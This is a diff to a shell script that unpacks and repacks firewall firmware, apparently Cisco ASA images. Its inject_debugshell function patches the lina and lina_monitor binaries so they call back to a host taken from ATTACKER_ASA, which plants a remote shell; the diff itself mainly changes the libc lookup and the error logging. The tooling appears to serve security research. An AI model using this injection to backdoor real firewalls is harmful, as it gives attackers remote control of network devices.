@@ -323,7 +323,7 @@ unpack_bin()
     ${FWTOOL} -u -f "$INFILE"
     if [ $? != 0 ];
     then
-        echo "${FWTOOL} -u -f "$INFILE" failed"
+        log "ERROR: ${FWTOOL} -u -f "$INFILE" failed"
         exit 1
     fi
     ${GUNZIP} -c "$GZIP_ORIGINAL" > "$CPIO_ORIGINAL"
@@ -591,16 +591,24 @@ inject_debugshell()
             CBHOST=${ATTACKER_ASA}
         fi
         log "Adding debug shell for $CBHOST:$CBPORT"
-        LIBC=$(find ${PWD} -name libc.so.6)
+        # If it is a 32-bit firmware, it should not contain the lib64 path so
+        # it is safe to search in this order
+        LIBC=$(find ${PWD} -regex ".*/lib64/libc.so.6")
+        if [[ "$LIBC" == "" ]]
+        then
+            LIBC=$(find ${PWD} -regex ".*/lib/libc.so.6")
+        fi
+        # NOTE: we pass as many arguments as possible to LINA_LINUXSHELL and it is up to that script to know
+        #       if libc is used for malloc()/etc. and if lina_monitor needs to be patched.
         CMD="${LINA_LINUXSHELL} -b ${FWFILE} -F ${PWD}/asa/bin/lina_monitor -O ${PWD}/asa/bin/lina_monitor -f ${PWD}/asa/bin/lina -o ${PWD}/asa/bin/lina -c $CBHOST -p $CBPORT -d ${ASADBG_DB} ${ADDITIONAL_ARGS} --libc-input ${LIBC} --libc-output ${LIBC}"
 
-        log "Using command: ${CMD}"
+        log "Using command: '${CMD}'"
         # XXX - fix fact that we use -b to specify the bin_name but it would not work if the name is not one of the original Cisco ones (such as asa924-k8.bin)
         ${CMD}
 
         if [ $? != 0 ];
         then
-            echo "${LINA_LINUXSHELL} -b "$FWFILE" -F $(pwd)/asa/bin/lina_monitor -O $(pwd)/asa/bin/lina_monitor -f $(pwd)/asa/bin/lina -o $(pwd)/asa/bin/lina -c $CBHOST -p $CBPORT -d "$ASADBG_DB" failed"
+            log "ERROR: '${CMD}' failed"
             exit 1
         fi
     fi
@@ -751,7 +759,7 @@ repack_bin()
     ${FWTOOL} -r -f "$FWFILE" -g "$GZIP_MODIFIED" -o "$OUTFILE" $ROOTARGS
     if [ $? != 0 ];
     then
-        echo "${FWTOOL} -r -f "$FWFILE" -g "$GZIP_MODIFIED" -o "$OUTFILE" $ROOTARGS failed"
+        log "${FWTOOL} -r -f "$FWFILE" -g "$GZIP_MODIFIED" -o "$OUTFILE" $ROOTARGS failed"
         exit 1
     fi
 
